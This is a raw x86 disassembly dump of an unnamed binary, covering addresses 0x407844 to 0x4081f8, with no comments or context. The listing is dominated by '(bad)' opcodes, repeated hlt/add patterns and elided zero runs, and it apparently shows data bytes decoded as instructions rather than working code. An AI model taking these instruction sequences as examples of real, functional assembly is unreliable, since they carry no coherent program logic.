  407844:	pop    eax
  407845:	hlt    
  407846:	add    al,0xdd
  407848:	add    esi,esp
  40784a:	add    al,0xf4
  40784c:	pop    eax
  40784d:	hlt    
  40784e:	add    al,0xec
  407850:	add    esi,esp
  407852:	add    al,0xfa
  407854:	pop    eax
  407855:	hlt    
  407856:	add    al,0xfa
  407858:	add    esi,esp
  40785a:	add    al,0xe2
  40785c:	pop    eax
  40785d:	hlt    
  40785e:	add    al,0xe2
  407860:	add    esi,esp
  407862:	add    al,0x36
  407864:	pop    ecx
  407865:	hlt    
  407866:	add    al,0xff
  407868:	add    al,BYTE PTR [eax]
	...
  407882:	hlt    
  407883:	add    al,0xb9
  407885:	pop    eax
  407886:	hlt    
  407887:	add    al,0xc5
  407889:	add    dh,ah
  40788b:	add    al,0xb8
  40788d:	pop    eax
  40788e:	hlt    
  40788f:	add    al,0xc4
  407891:	add    dh,ah
  407893:	add    al,0x9b
  407895:	pop    eax
  407896:	hlt    
  407897:	add    al,0xc7
  407899:	add    dh,ah
  40789b:	add    al,0x0
  40789d:	call   0x4f6:0xc600053c
  4078a4:	add    BYTE PTR ds:0x1100052d,bh
  4078aa:	test   DWORD PTR [eax+eax*1],0x51d3c
  4078b1:	or     bh,dh
  4078b3:	add    al,0x0
  4078b5:	pop    ds
  4078b6:	int    0x4
  4078b8:	add    BYTE PTR [ebx],cl
  4078ba:	test   DWORD PTR [eax+eax*1],0x4bd1e
  4078c1:	or     dh,bh
  4078c3:	add    al,0x0
  4078c5:	or     DWORD PTR [ebp-0x82ffffc],ebp
  4078cb:	add    al,0x0
  4078cd:	or     BYTE PTR [ebp-0x842fffc],bl
  4078d3:	add    al,0x0
  4078d5:	or     ecx,ebp
  4078d7:	add    al,0x0
  4078d9:	shl    bh,cl
  4078db:	add    al,0x0
  4078dd:	or     bh,BYTE PTR [ebp-0x943fffc]
  4078e3:	add    al,0x0
  4078e5:	rol    DWORD PTR [eax],cl
	...
  4078ff:	lods   al,BYTE PTR ds:[esi]
  407900:	add    al,0x0
  407902:	push   cs
  407903:	lock add al,0x0
  407906:	ret    0x49c
  407909:	add    dl,ch
  40790b:	test   BYTE PTR [eax+eax*1],0x69
  40790f:	dec    esp
  407910:	add    eax,0x4f00900
  407915:	add    BYTE PTR [eax+0x3c],ah
  407918:	add    eax,0x4f7e000
  40791d:	add    BYTE PTR [esp+ebp*1+0x5],dh
  407921:	add    ah,ch
  407923:	test   BYTE PTR [eax+eax*1],0x78
  407927:	sbb    al,0x5
  407929:	add    BYTE PTR [ecx+0x4f7],bl
  40792f:	dec    edi
  407930:	lods   eax,DWORD PTR ds:[esi]
  407931:	(bad)  
  407932:	jmp    FWORD PTR [esi+eax*1]
  407935:	add    BYTE PTR [eax],al
  407937:	lods   eax,DWORD PTR ds:[esi]
  407939:	(bad)  
  40793a:	call   FWORD PTR [edi]
  40793c:	push   es
  40793d:	add    BYTE PTR [eax],al
  40793f:	adc    DWORD PTR [edx+0x92effff],edi
  407945:	add    BYTE PTR [eax],al
  407947:	add    BYTE PTR [edx+0x8f1ffff],bh
  40794d:	add    BYTE PTR [eax],al
  40794f:	sar    DWORD PTR [ecx+0x8f0ffff],cl
  407955:	add    BYTE PTR [eax],al
  407957:	ret    0xffb9
  40795a:	push   ebx
  40795c:	or     BYTE PTR [eax],al
  40795e:	add    BYTE PTR [ebp-0x46],dh
  407961:	(bad)  
  407962:	inc    DWORD PTR [eax]
	...
  40797c:	xor    al,BYTE PTR [esi]
  40797e:	add    BYTE PTR [eax],al
  407980:	les    edi,FWORD PTR [ecx+0x635ffff]
  407986:	add    BYTE PTR [eax],al
  407988:	cdq    
  407989:	mov    ecx,0x63effff
  40798e:	add    BYTE PTR [eax],al
  407990:	(bad)  
  407991:	mov    ecx,0x62cffff
  407996:	add    BYTE PTR [eax],al
  407998:	jbe    0x407954
  40799a:	(bad)  
  40799b:	(bad)  
  40799c:	dec    DWORD PTR [eax]
  40799e:	add    BYTE PTR [eax],al
  4079a0:	mov    BYTE PTR [ecx+0x619ffff],bh
  4079a6:	add    BYTE PTR [eax],al
  4079a8:	pop    ebx
  4079a9:	mov    edx,0x8f8ffff
  4079ae:	add    BYTE PTR [eax],al
  4079b0:	dec    edx
  4079b1:	mov    edx,0x5dbffff
  4079b6:	add    BYTE PTR [eax],al
  4079b8:	daa    
  4079b9:	mov    edx,0x567ffff
  4079be:	add    BYTE PTR [eax],al
  4079c0:	hlt    
  4079c1:	(bad)  
  4079c2:	push   esi
  4079c3:	add    ah,dh
  4079c5:	xchg   BYTE PTR [ebx],al
  4079c7:	add    ah,dh
  4079c9:	mov    bh,0x56
  4079cb:	add    ah,dh
  4079cd:	jg     0x4079d2
  4079cf:	add    ah,dh
  4079d1:	enter  0x56,0xf4
  4079d5:	rol    BYTE PTR [edx],1
  4079d7:	add    ah,dh
  4079d9:	jns    0x407a31
  4079db:	add    ah,dh
  4079dd:	rol    DWORD PTR [ebx],0x0
	...
  4079f8:	add    ah,dh
  4079fa:	mov    dl,BYTE PTR [esi+0x0]
  4079fd:	hlt    
  4079fe:	adc    al,BYTE PTR ds:0x55cbf400
  407a04:	add    ah,dh
  407a06:	mov    ebx,0xccf40003
  407a0b:	push   ebp
  407a0c:	add    ah,dh
  407a0e:	mov    esp,0xadf40003
  407a13:	push   ebp
  407a14:	add    ah,dh
  407a16:	std    
  407a17:	add    eax,DWORD PTR [eax]
  407a19:	hlt    
  407a1a:	scas   al,BYTE PTR es:[edi]
  407a1b:	push   ebp
  407a1c:	add    ah,dh
  407a1e:	inc    BYTE PTR [ebx]
  407a20:	add    ah,dh
  407a22:	orps   xmm0,XMMWORD PTR [eax]
  407a25:	hlt    
  407a26:	pop    es
  407a27:	add    al,0x0
  407a29:	hlt    
  407a2a:	adc    BYTE PTR [esi+0x0],dl
  407a2d:	hlt    
  407a2e:	or     BYTE PTR [eax+eax*1],al
  407a31:	hlt    
  407a32:	jno    0x407a8a
  407a34:	add    ah,dh
  407a36:	dec    ecx
  407a37:	add    eax,DWORD PTR [eax]
  407a39:	hlt    
  407a3a:	jb     0x407a92
  407a3c:	add    ah,dh
  407a3e:	dec    edx
  407a3f:	add    eax,DWORD PTR [eax]
  407a41:	hlt    
  407a42:	test   DWORD PTR [esi+0x0],edx
  407a45:	hlt    
  407a46:	xor    eax,0xd4f40003
  407a4b:	push   ebp
  407a4c:	add    ah,dh
  407a4e:	inc    esp
  407a4f:	add    eax,DWORD PTR [eax]
  407a51:	hlt    
  407a52:	add    al,0x67
  407a54:	push   esi
  407a55:	hlt    
  407a56:	add    al,0x99
  407a58:	add    esi,esp
  407a5a:	add    al,0x56
  407a5c:	push   esi
	...
  407a75:	add    ah,dh
  407a77:	add    al,0x98
  407a79:	add    esi,esp
  407a7b:	add    al,0x29
  407a7d:	push   esi
  407a7e:	hlt    
  407a7f:	add    al,0x7b
  407a81:	add    esi,esp
  407a83:	add    al,0x28
  407a85:	push   esi
  407a86:	hlt    
  407a87:	add    al,0x7a
  407a89:	add    esi,esp
  407a8b:	add    al,0xab
  407a8d:	push   ebp
  407a8e:	hlt    
  407a8f:	add    al,0x55
  407a91:	add    al,0xf4
  407a93:	add    al,0xaa
  407a95:	push   ebp
  407a96:	hlt    
  407a97:	add    al,0x54
  407a99:	add    al,0xf4
  407a9b:	add    al,0xad
  407a9d:	push   ebp
  407a9e:	hlt    
  407a9f:	add    al,0x37
  407aa1:	add    al,0xf4
  407aa3:	add    al,0xac
  407aa5:	push   ebp
  407aa6:	hlt    
  407aa7:	add    al,0x36
  407aa9:	add    al,0xf4
  407aab:	add    al,0xaf
  407aad:	push   ebp
  407aae:	hlt    
  407aaf:	add    al,0x21
  407ab1:	add    al,0xf4
  407ab3:	add    al,0xae
  407ab5:	push   ebp
  407ab6:	hlt    
  407ab7:	add    al,0x10
  407ab9:	add    al,0xf4
  407abb:	add    al,0xb1
  407abd:	push   ebp
  407abe:	hlt    
  407abf:	add    al,0x3
  407ac1:	add    al,0xf4
  407ac3:	add    al,0xa0
  407ac5:	push   ebp
  407ac6:	hlt    
  407ac7:	add    al,0xf2
  407ac9:	add    esi,esp
  407acb:	add    al,0x33
  407acd:	push   ebp
  407ace:	hlt    
  407acf:	add    al,0xdd
  407ad1:	add    esi,esp
  407ad3:	add    al,0x22
  407ad5:	push   ebp
  407ad6:	hlt    
  407ad7:	add    al,0xcc
  407ad9:	add    eax,DWORD PTR [eax]
	...
  407af3:	hlt    
  407af4:	add    al,0x35
  407af6:	push   ebp
  407af7:	hlt    
  407af8:	add    al,0xbf
  407afa:	add    esi,esp
  407afc:	add    al,0x0
  407afe:	and    al,0x41
  407b00:	add    eax,0x4f7ae00
  407b05:	add    BYTE PTR [edi],dh
  407b07:	and    DWORD PTR ds:0x4f86900,eax
  407b0d:	add    BYTE PTR [esi],ah
  407b0f:	and    DWORD PTR ds:0x4f86800,eax
  407b15:	add    BYTE PTR [ecx],bl
  407b17:	inc    ecx
  407b18:	add    eax,0x4f86b00
  407b1d:	add    BYTE PTR [eax],bl
  407b1f:	inc    ecx
  407b20:	add    eax,0x4f86a00
  407b25:	add    BYTE PTR [ebx+0x65000520],bh
  407b2b:	test   DWORD PTR [eax+eax*1],0x520ba
  407b32:	test   DWORD PTR fs:[eax+eax*1],0x4c09d
  407b3a:	test   DWORD PTR [si],0x4c09c00
  407b41:	add    BYTE PTR [esi-0x9],ah
  407b44:	add    al,0x0
  407b46:	mov    BYTE PTR [eax-0x8b6fffc],ah
  407b4c:	add    al,0x0
  407b4e:	mov    esp,DWORD PTR [eax-0x8b7fffc]
  407b54:	add    al,0x0
  407b56:	mov    al,BYTE PTR [eax]
	...
  407b70:	rol    BYTE PTR [eax+eax*1],0x4b
  407b74:	test   DWORD PTR [eax+eax*1],0x4c08d
  407b7b:	dec    edx
  407b7c:	test   BYTE PTR [eax+eax*1],0x50
  407b80:	mov    al,ds:0xf7850004
  407b85:	add    al,0x0
  407b87:	inc    ebx
  407b88:	mov    al,ds:0xf6840004
  407b8d:	add    al,0x0
  407b8f:	add    BYTE PTR [esi-0x47],al
  407b92:	(bad)  
  407b93:	call   DWORD PTR [esi+0x31000002]
  407b99:	mov    ecx,0x281ffff
  407b9e:	add    BYTE PTR [eax],al
  407ba0:	jp     0x407b5b
  407ba2:	(bad)  
  407ba3:	inc    DWORD PTR [eax+0x5a000002]
  407ba9:	add    bh,BYTE PTR ds:0x407b7900
  407baf:	add    BYTE PTR [edi-0x7efffafd],ch
  407bb5:	jnp    0x407bf7
  407bb7:	add    BYTE PTR [eax],cl
  407bb9:	add    ch,BYTE PTR [edi]
  407bbb:	add    BYTE PTR [ecx+0x7b],dl
  407bbe:	inc    eax
  407bbf:	add    ah,cl
  407bc1:	or     BYTE PTR ds:0x3fcff900,al
  407bc7:	add    BYTE PTR [esi],ah
  407bc9:	or     DWORD PTR ds:0x3fd16100,eax
  407bcf:	add    BYTE PTR [esi+0xe09],ah
	...
  407bed:	push   ecx
  407bee:	sar    DWORD PTR [edi],1
  407bf0:	add    BYTE PTR [ebx-0x76ffebf7],ah
  407bf6:	sar    DWORD PTR [edi],1
  407bf8:	add    BYTE PTR [ebx+0x2],bl
  407bfb:	or     DWORD PTR [eax],eax
  407bfd:	sar    DWORD PTR gs:[edi],1
  407c00:	add    BYTE PTR [edi],ch
  407c02:	add    al,BYTE PTR [esi]
  407c04:	add    BYTE PTR [ebp-0x2f],bh
  407c07:	aas    
  407c08:	add    ah,al
  407c0a:	or     BYTE PTR ds:0x3fd15500,al
  407c10:	add    BYTE PTR [edx+0x69000308],ah
  407c16:	sar    DWORD PTR [edi],1
  407c18:	add    BYTE PTR [edx+eax*1],al
  407c1b:	adc    eax,DWORD PTR [eax]
  407c1d:	int    0xd0
  407c1f:	aas    
  407c20:	add    ah,dh
  407c22:	test   eax,0x77f40a03
  407c27:	jl     0x407c69
  407c29:	hlt    
  407c2a:	fild   WORD PTR [ebx]
  407c2c:	push   es
  407c2d:	hlt    
  407c2e:	jg     0x407cac
  407c30:	inc    eax
  407c31:	hlt    
  407c32:	retf   0x603
  407c35:	hlt    
  407c36:	xchg   DWORD PTR [eax+eax*2-0xc],edi
  407c3a:	mov    BYTE PTR [ecx+ecx*1],al
  407c3d:	hlt    
  407c3e:	cmp    DWORD PTR [eax+eax*2-0xc],0x47
  407c43:	add    eax,DWORD PTR [esp+esi*8]
  407c46:	retf   
  407c47:	jnp    0x407c89
  407c49:	hlt    
  407c4a:	or     DWORD PTR [eax+ecx*1],eax
  407c4d:	hlt    
  407c4e:	out    0x7b,eax
  407c50:	inc    eax
	...
  407c69:	add    ah,dh
  407c6b:	mov    edx,0xd7f40e03
  407c70:	jp     0x407cb2
  407c72:	hlt    
  407c73:	repnz add eax,DWORD PTR [ebx]
  407c76:	hlt    
  407c77:	stos   DWORD PTR es:[edi],eax
  407c78:	jnp    0x407cba
  407c7a:	hlt    
  407c7b:	lods   eax,DWORD PTR ds:[esi]
  407c7c:	add    eax,DWORD PTR [esp+esi*8]
  407c7f:	ret    
  407c80:	jnp    0x407cc2
  407c82:	hlt    
  407c83:	fiadd  WORD PTR [edx]
  407c85:	or     esp,esi
  407c87:	out    dx,eax
  407c88:	jnp    0x407cca
  407c8a:	hlt    
  407c8b:	outs   dx,BYTE PTR ds:[esi]
  407c8c:	add    esi,DWORD PTR [eax]
  407c8e:	hlt    
  407c8f:	add    edi,DWORD PTR [eax+eax*2-0xc]
  407c93:	scas   al,BYTE PTR es:[edi]
  407c94:	add    al,BYTE PTR [edi]
  407c96:	hlt    
  407c97:	cmp    edi,DWORD PTR [ebx+0x40]
  407c9a:	hlt    
  407c9b:	mov    DWORD PTR [edx],0x7b57f409
  407ca1:	inc    eax
  407ca2:	hlt    
  407ca3:	fild   WORD PTR [edx]
  407ca5:	or     dh,ah
  407ca7:	push   ebx
  407ca8:	jnp    0x407cea
  407caa:	hlt    
  407cab:	in     al,0x2
  407cad:	adc    dh,ah
  407caf:	xlat   BYTE PTR ds:[ebx]
  407cb0:	mov    DWORD PTR [eax-0xc],eax
  407cb3:	add    al,0x2
  407cb5:	add    al,0xd4
  407cb7:	add    al,0x39
  407cb9:	mov    dh,BYTE PTR [esp+eax*1+0x4f8035c]
  407cc0:	and    DWORD PTR [edx+0x3bb0534],ecx
  407cc6:	adc    eax,0x348a8505
  407ccb:	add    eax,0x341
	...
  407ce4:	add    BYTE PTR [eax],al
  407ce6:	add    BYTE PTR [esi],al
  407ce8:	add    eax,0x5348ab9
  407ced:	nop
  407cee:	add    edx,DWORD PTR [esi]
  407cf0:	add    eax,0x5348aad
  407cf5:	jno    0x407cfa
  407cf7:	add    BYTE PTR ds:0x5348acd,al
  407cfd:	pop    edx
  407cfe:	add    edi,edi
  407d00:	add    al,0xc9
  407d02:	mov    dh,BYTE PTR [eax*1+0x50303b1]
  407d09:	(bad)  [edx+0x4c90534]
  407d0f:	in     al,dx
  407d10:	add    al,0xe5
  407d12:	mov    BYTE PTR [eax*1+0x4f90430],dh
  407d19:	int    0x8a
  407d1b:	mov    ah,0x4
  407d1d:	pusha  
  407d1e:	add    al,0xf6
  407d20:	add    al,0xc1
  407d22:	mov    dh,BYTE PTR [esp+eax*1+0x4e8043b]
  407d29:	leave  
  407d2a:	mov    dh,BYTE PTR [esp+eax*1+0x4e5044f]
  407d31:	lods   eax,DWORD PTR ds:[esi]
  407d32:	mov    dh,BYTE PTR [esp+eax*1+0x50504a3]
  407d39:	push   ecx
  407d3a:	mov    dh,BYTE PTR [esp+eax*1+0x4fb03ba]
  407d41:	cmp    DWORD PTR [edx-0x1efffb4c],ecx
  407d47:	idiv   edx
  407d49:	dec    DWORD PTR [eax+0x0]
	...
  407d64:	jle    0x407d2b
  407d66:	inc    DWORD PTR [eax-0x8]
  407d69:	clc    
  407d6a:	(bad)  
  407d6b:	js     0x407ddb
  407d6d:	(bad)  
  407d70:	clc    
  407d71:	add    BYTE PTR [eax],al
  407d73:	popa   
  407d74:	jle    0x407d3a
  407d76:	jmp    FWORD PTR [ebp+0x690003f7]
  407d7c:	outs   dx,BYTE PTR ds:[esi]
  407d7d:	(bad)  
  407d7e:	jmp    FWORD PTR [ebx]
  407d80:	clc    
  407d81:	stc    
  407d82:	(bad)  
  407d83:	mov    eax,0x5effc47d
  407d88:	clc    
  407d89:	cld    
  407d8a:	inc    DWORD PTR [ebp+ebp*2-0x820003c]
  407d91:	cld    
  407d92:	push   DWORD PTR [eax-0x3003b83]
  407d98:	test   DWORD PTR [ebx],0xc46d9900
  407d9e:	inc    esi
  407da0:	div    ecx
  407da2:	push   DWORD PTR [eax+0x73ffc47d]
  407da8:	idiv   edi
  407daa:	dec    DWORD PTR [esi+ebp*2]
  407dad:	(bad)  
  407dae:	inc    DWORD PTR [eax+0x8fffff7]
  407db4:	jle    0x407d7a
  407db6:	jmp    FWORD PTR [ebp-0x9]
  407db9:	idiv   bh
  407dbb:	in     al,dx
  407dbc:	ins    DWORD PTR es:[edi],dx
  407dbd:	(bad)  
  407dbe:	push   DWORD PTR [edx]
  407dc0:	clc    
  407dc1:	std    
  407dc2:	(bad)  
  407dc3:	call   0xc1404245
	...
  407de0:	add    bh,dh
  407de2:	idiv   edi
  407de4:	mov    WORD PTR [edx-0x3c],?
  407de7:	(bad)  
  407de8:	std    
  407de9:	idiv   esp
  407deb:	dec    DWORD PTR [eax-0x3b8e]
  407df1:	dec    ebx
  407df2:	pop    es
  407df3:	(bad)  
  407df5:	jge    0x407d79
  407df7:	inc    eax
  407df8:	add    bh,dl
  407dfa:	add    BYTE PTR [edi],al
  407dfc:	add    BYTE PTR [ebp-0x7e],dl
  407dff:	inc    eax
  407e00:	add    BYTE PTR [ebp+0x7],al
  407e03:	or     al,0x0
  407e05:	push   ebp
  407e06:	add    BYTE PTR [eax+0x0],0xa9
  407e0a:	push   es
  407e0b:	or     DWORD PTR [eax],eax
  407e0d:	imul   eax,DWORD PTR [ebx+0x6470040],0x836d000a
  407e17:	inc    eax
  407e18:	add    BYTE PTR [ecx],ch
  407e1a:	push   es
  407e1b:	add    al,0x0
  407e1d:	and    eax,0x28004083
  407e22:	push   es
  407e23:	inc    esi
  407e24:	add    DWORD PTR [ebp-0x7e],edi
  407e27:	inc    eax
  407e28:	add    bh,ch
  407e2a:	add    eax,0x81050055
  407e2f:	inc    eax
  407e30:	add    BYTE PTR [ecx],bl
  407e32:	push   es
  407e33:	sub    DWORD PTR [eax],eax
  407e35:	leave  
  407e36:	add    BYTE PTR [eax+0x0],0x51
  407e3a:	push   es
  407e3b:	or     al,BYTE PTR [eax]
  407e3d:	fld    QWORD PTR [eax+0x1010040]
  407e43:	xor    eax,DWORD PTR [eax]
	...
  407e5d:	add    BYTE PTR [ecx],cl
  407e5f:	xchg   BYTE PTR [eax+0x0],al
  407e62:	push   esp
  407e63:	push   es
  407e64:	pop    es
  407e65:	add    cl,dl
  407e67:	test   DWORD PTR [eax+0x0],eax
  407e6a:	fild   WORD PTR [eax]
  407e6c:	or     DWORD PTR [eax],eax
  407e6e:	mov    ch,0x85
  407e70:	inc    eax
  407e71:	add    bl,dl
  407e73:	add    BYTE PTR [eax+eax*1],ch
  407e76:	adc    eax,0x5d004086
  407e7b:	add    DWORD PTR [eax+eax*1],ecx
  407e7e:	push   ebp
  407e7f:	xchg   DWORD PTR [eax+0x0],eax
  407e82:	hlt    
  407e83:	cmp    eax,DWORD PTR [ebx]
  407e85:	inc    esp
  407e86:	hlt    
  407e87:	imul   eax,DWORD PTR [edx+0x480f440],0x4
  407e8e:	hlt    
  407e8f:	jae    0x407e13
  407e91:	inc    eax
  407e92:	hlt    
  407e93:	sbb    eax,DWORD PTR [esp+eax*1]
  407e96:	hlt    
  407e97:	jnp    0x407e1b
  407e99:	inc    eax
  407e9a:	hlt    
  407e9b:	mov    ah,0x3
  407e9d:	or     dh,ah
  407e9f:	jb     0x3d572e5
  407ea5:	push   es
  407ea6:	hlt    
  407ea7:	out    0x81,eax
  407ea9:	inc    eax
  407eaa:	hlt    
  407eab:	(bad)  
  407ead:	es hlt 
  407eaf:	jg     0x407e33
  407eb1:	inc    eax
  407eb2:	hlt    
  407eb3:	bound  eax,QWORD PTR [ebx]
  407eb5:	add    eax,0x4081b7f4
  407eba:	hlt    
  407ebb:	fiadd  DWORD PTR [ebx]
  407ebd:	pop    es
  407ebe:	hlt    
  407ebf:	iret   
  407ec0:	add    DWORD PTR [eax+0x0],0x0
	...
  407edb:	hlt    
  407edc:	sbb    eax,0xcbf40304
  407ee1:	add    DWORD PTR [eax-0xc],0xf41703f5
  407ee8:	add    DWORD PTR [ecx+0x425f440],0xf
  407eef:	hlt    
  407ef0:	add    DWORD PTR [ecx+0x3ebf440],0x5
  407ef7:	hlt    
  407ef8:	mov    ebx,0xa2f44081
  407efd:	add    edx,DWORD PTR [esp+esi*8]
  407f00:	and    eax,DWORD PTR [edx+0x35df440]
  407f06:	push   ds
  407f07:	hlt    
  407f08:	repz add DWORD PTR [eax-0xc],0xf4070416
  407f10:	sti    
  407f11:	add    DWORD PTR [eax-0xc],0xe4040304
  407f18:	add    al,0xed
  407f1a:	xor    DWORD PTR [esp+eax*1+0x4f20405],0x4b481e5
  407f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f26:	add    esi,edi
  407f28:	add    al,0xe9
  407f2a:	xor    DWORD PTR [esp+eax*1+0x4db039f],0x4b48499
  407f35:	xchg   ecx,eax
  407f36:	add    esp,ebx
  407f38:	add    al,0xa1
  407f3a:	test   BYTE PTR [eax*1+0x374],dh
	...
  407f55:	add    BYTE PTR [eax],al
  407f57:	add    BYTE PTR [esi],cl
  407f59:	add    eax,0x534846d
  407f5e:	push   ebx
  407f5f:	add    ebp,ebx
  407f61:	add    al,0x6d
  407f63:	test   BYTE PTR [eax*1+0x4e0038a],dh
  407f6a:	mov    ch,0x84
  407f6c:	xor    al,0x5
  407f6e:	int    0x3
  407f70:	fild   DWORD PTR [esi*4-0x15facb7c]
  407f77:	add    edx,eax
  407f79:	add    al,0xbd
  407f7b:	test   BYTE PTR [eax*1+0x4ee02fe],dh
  407f82:	leave  
  407f83:	test   BYTE PTR [eax*1+0x4f0035c],dh
  407f8a:	rol    DWORD PTR [esp+esi*1-0xffba7fb],1
  407f91:	add    al,0xf9
  407f93:	xor    BYTE PTR [esp+eax*1+0x4f804b6],0xe9
  407f9b:	xor    BYTE PTR [esp+eax*1+0x5050418],0xcd
  407fa3:	test   BYTE PTR [esp+eax*1-0x90fe400],dh
  407faa:	dec    DWORD PTR [eax+edi*2-0xfd6003b]
  407fb1:	clc    
  407fb2:	jmp    FWORD PTR [eax+edi*2-0xfed003b]
  407fb9:	bnd call DWORD PTR [eax+0x0]
	...
  407fd5:	js     0x407f9c
  407fd7:	jmp    DWORD PTR [eax+0x60ffe6f0]
  407fdd:	js     0x407fa4
  407fdf:	inc    DWORD PTR [ecx]
  407fe1:	lock adc eax,0xc5780500
  407fe7:	(bad)  
  407fe8:	fdiv   st,st(7)
  407fea:	std    
  407feb:	inc    eax
  407fed:	ja     0x407fb3
  407fef:	dec    edx
  407ff1:	idiv   eax
  407ff3:	jmp    DWORD PTR [eax-0x30003b89]
  407ff9:	idiv   eax
  407ffb:	inc    DWORD PTR [eax]
  407ffd:	js     0x407fc3
  407fff:	push   DWORD PTR [edi]
  408001:	lock (bad) 
  408003:	(bad)  
  408004:	clc    
  408005:	ja     0x407fcb
  408007:	call   FWORD PTR [edx-0x10]
  40800a:	lock inc DWORD PTR [eax]
  40800d:	js     0x407fd3
  40800f:	call   FWORD PTR [ecx-0x10]
  408012:	add    BYTE PTR [eax],al
  408014:	stc    
  408015:	ja     0x407fdb
  408017:	jmp    DWORD PTR [edx-0x10]
  40801a:	add    BYTE PTR [eax],al
  40801c:	icebp  
  40801d:	ja     0x407fe3
  40801f:	call   FWORD PTR [edi+esi*8+0x77e90000]
  408026:	(bad)  
  408027:	jmp    DWORD PTR [ecx]
  408029:	lock (bad) 
  40802b:	jmp    eax
  40802d:	inc    eax
  40802e:	pop    es
  40802f:	add    BYTE PTR [eax+esi*8],bh
  408032:	clc    
  408033:	inc    eax
  408035:	xor    BYTE PTR [edi],al
	...
  40804f:	add    BYTE PTR [eax],al
  408051:	add    BYTE PTR [edi+0x3d000403],dl
  408057:	cmp    BYTE PTR [edi],bh
  408059:	add    ah,al
  40805b:	add    ebx,DWORD PTR [esi]
  40805d:	add    BYTE PTR [ebp-0x24ffc0c8],cl
  408063:	add    BYTE PTR [edi],al
  408065:	add    BYTE PTR [ebp-0x36ffc0c8],dl
  40806b:	add    ecx,DWORD PTR [edi]
  40806d:	add    BYTE PTR [ebp+0x21003f38],dh
  408073:	add    ecx,DWORD PTR [ebx]
  408075:	add    BYTE PTR [ecx+0x7b003f38],dh
  40807b:	add    ecx,DWORD PTR [ecx]
  40807d:	add    BYTE PTR [ebp+0x2c003f38],bl
  408083:	add    ecx,DWORD PTR ds:0x3f395d00
  408089:	add    BYTE PTR [edx],bh
  40808b:	add    cl,BYTE PTR [edx]
  40808d:	add    cl,cl
  40808f:	cmp    DWORD PTR [edi],edi
  408091:	add    BYTE PTR [ebp+0x2],al
  408094:	or     eax,0x3f39b900
  408099:	add    BYTE PTR [edi+0x2],al
  40809c:	push   ss
  40809d:	add    BYTE PTR [ecx+0x39],ah
  4080a0:	aas    
  4080a1:	add    cl,bh
  4080a3:	add    DWORD PTR ds:0x3f39c900,edx
  4080a9:	add    ch,bl
  4080ab:	add    DWORD PTR [eax+eax*1],edx
  4080ae:	xchg   ecx,eax
  4080af:	cmp    DWORD PTR [edi],edi
  4080b1:	add    BYTE PTR [ebp+0x2],ch
  4080b4:	sldt   WORD PTR [eax]
	...
  4080cf:	mov    eax,ds:0xed003f39
  4080d4:	add    DWORD PTR [eax+eax*1],ecx
  4080d7:	xchg   ecx,eax
  4080d8:	cmp    DWORD PTR [edi],edi
  4080da:	add    dh,dl
  4080dc:	add    BYTE PTR [ebx],cl
  4080de:	add    BYTE PTR [ebp+0x3b],cl
  4080e1:	aas    
  4080e2:	add    ah,dh
  4080e4:	jge    0x4080ea
  4080e6:	or     al,0xf4
  4080e8:	cmp    ecx,edx
  4080ea:	aas    
  4080eb:	hlt    
  4080ec:	sub    BYTE PTR [ebx],al
  4080ee:	adc    ah,dh
  4080f0:	xchg   edi,eax
  4080f1:	retf   0xf43f
  4080f4:	mov    BYTE PTR [ebx],0x13
  4080f7:	hlt    
  4080f8:	ror    ecx,cl
  4080fa:	aas    
  4080fb:	hlt    
  4080fc:	push   eax
  4080fd:	add    ecx,DWORD PTR [esi]
  4080ff:	hlt    
  408100:	mov    bl,0xc9
  408102:	aas    
  408103:	hlt    
  408104:	lock add edx,DWORD PTR [ecx]
  408107:	hlt    
  408108:	iret   
  408109:	leave  
  40810a:	aas    
  40810b:	hlt    
  40810c:	in     al,0x3
  40810e:	push   cs
  40810f:	hlt    
  408110:	(bad)  
  408112:	aas    
  408113:	hlt    
  408114:	sub    al,0x3
  408116:	adc    ah,dh
  408118:	dec    ebx
  408119:	leave  
  40811a:	aas    
  40811b:	hlt    
  40811c:	pop    edi
  40811d:	add    edx,DWORD PTR [ecx]
  40811f:	hlt    
  408120:	xchg   ecx,ecx
  408122:	aas    
  408123:	hlt    
  408124:	imul   eax,DWORD PTR [edx*1+0x3fc99ff4],0x140369f4
  40812f:	hlt    
  408130:	test   ecx,0x3f
	...
  40814a:	add    BYTE PTR [eax],al
  40814c:	hlt    
  40814d:	xchg   esp,eax
  40814e:	add    edx,DWORD PTR [edi]
  408150:	hlt    
  408151:	das    
  408152:	leave  
  408153:	aas    
  408154:	hlt    
  408155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408156:	add    edx,DWORD PTR [edx]
  408158:	hlt    
  408159:	pop    ebx
  40815a:	leave  
  40815b:	aas    
  40815c:	hlt    
  40815d:	cdq    
  40815e:	add    ebx,DWORD PTR [eax]
  408160:	hlt    
  408161:	dec    eax
  408163:	aas    
  408164:	hlt    
  408165:	mov    edx,0x13f41903
  40816a:	leave  
  40816b:	aas    
  40816c:	hlt    
  40816d:	arpl   WORD PTR [ebx],ax
  40816f:	and    esi,esp
  408171:	mov    edi,0x4f43fc8
  408176:	fld    DWORD PTR [ebx]
  408178:	sbb    DWORD PTR ds:0x52bc95d,eax
  40817e:	push   ss
  40817f:	add    al,0xff
  408181:	add    al,0x49
  408183:	leave  
  408184:	sbb    eax,DWORD PTR ds:0x4f7041e
  40818a:	sbb    eax,0x41050bc9
  40818f:	add    al,0xfb
  408191:	add    al,0x15
  408193:	leave  
  408194:	sti    
  408195:	add    al,0xc8
  408197:	add    edi,ebx
  408199:	add    al,0x2d
  40819b:	leave  
  40819c:	jmp    0x4081a2
  40819e:	add    BYTE PTR [eax+eax*1],al
  4081a1:	add    eax,0x4dbc8bd
  4081a6:	ret    0xfb03
  4081a9:	add    al,0xc5
  4081ab:	enter  0x4cb,0x51
  4081af:	add    eax,DWORD PTR [eax]
	...
  4081c9:	out    dx,al
  4081ca:	add    al,0xd1
  4081cc:	enter  0x4bb,0x12
  4081d0:	add    al,0x40
  4081d2:	add    eax,0x52bc731
  4081d7:	fiadd  WORD PTR [ebx]
  4081d9:	push   ss
  4081da:	add    eax,0x51bc789
  4081df:	dec    esi
  4081e0:	add    esp,DWORD PTR [edx]
  4081e2:	add    eax,0x50bc7b9
  4081e7:	mov    bl,0x3
  4081e9:	clc    
  4081ea:	add    al,0xc1
  4081ec:	(bad)  
  4081ed:	sti    
  4081ee:	add    al,0xd0
  4081f0:	add    eax,DWORD PTR [edi]
  4081f2:	add    eax,0x4ebc7b5
  4081f7:	hlt    
  4081f8:	add    ecx,DWORD PTR [eax]
